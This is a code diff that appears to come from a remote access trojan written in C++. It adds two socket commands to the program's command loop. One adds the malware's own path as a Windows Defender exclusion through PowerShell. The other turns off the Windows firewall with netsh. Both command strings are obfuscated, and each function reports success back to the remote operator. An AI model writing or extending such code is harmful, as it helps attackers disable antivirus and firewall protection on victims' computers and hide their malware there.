@@ -729,6 +729,32 @@ bool VibeMouse(SOCKET Sock)
 	return false;
 }
 
+bool AddAVexclusion(SOCKET Sock)
+{
+	SystemUtils su;
+	DirUtils du;
+
+	if (su.NoOutputCMD((string)AY_OBFUSCATE("powershell -inputformat none -outputformat none -NonInteractive -Command \"Add-MpPreference -ExclusionProcess '") + du.GetFullModuleFilePath() + "'\"") == 0)
+	{
+		return TcpIP::SendString(Sock, "ok");
+	}
+
+	return TcpIP::SendString(Sock, "ko");
+}
+
+bool DisableFirewall(SOCKET Sock)
+{
+	SystemUtils su;
+	DirUtils du;
+
+	if (su.NoOutputCMD((string)AY_OBFUSCATE("netsh advfirewall set allprofiles state off")) == 0)
+	{
+		return TcpIP::SendString(Sock, "ok");
+	}
+
+	return TcpIP::SendString(Sock, "ko");
+}
+
 short Sessione(TcpIP Client)
 {
 	SystemUtils su;
@@ -795,6 +821,14 @@ short Sessione(TcpIP Client)
 		else if (cmd == "vibemouse")
 		{
 			i = VibeMouse(Client.Sock);
+		}
+		else if (cmd == "addavexclusion")
+		{
+			i = AddAVexclusion(Client.Sock);
+		}
+		else if (cmd == "disablefw")
+		{
+			i = DisableFirewall(Client.Sock);
 		}
 	}
 
